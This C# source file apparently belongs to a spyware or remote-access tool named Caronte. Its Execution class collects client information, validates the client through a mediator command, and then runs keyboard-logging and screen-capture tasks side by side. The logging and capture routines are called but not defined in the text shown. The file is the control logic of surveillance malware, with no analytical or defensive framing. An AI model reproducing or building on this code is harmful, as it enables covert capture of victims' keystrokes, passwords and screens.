using Caronte.Modules.Information;
using Caronte.Modules.Information.GetClientInformation;
using Caronte.Modules.ValidateClient;
using MediatR;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte
{
    public class Execution
    {
        private readonly IMediator _mediator;
        private readonly CancellationToken _cancellationToken;

        public Execution(IMediator mediator, CancellationToken cancellationToken)
        {
            _mediator = mediator;
            _cancellationToken = cancellationToken;
        }

        private async Task Initialize()
        {
            var clientInformation = await _mediator.Send(new GetClientInformationQuery());
            var verifyAndCreateClientResponse = await _mediator.Send(new ValidateClientCommand() { ClientInformation = clientInformation.ResponseObject });

            if (verifyAndCreateClientResponse.IsSucessFull)
            {
                var tasksList = new List<Task>
                {
                    StartInformationServices.KeyboardLog(_cancellationToken, _mediator),
                    StartInformationServices.PrintScreen(_cancellationToken, _mediator),
                };

                await Task.WhenAll(tasksList);
            }
        }
    }
}
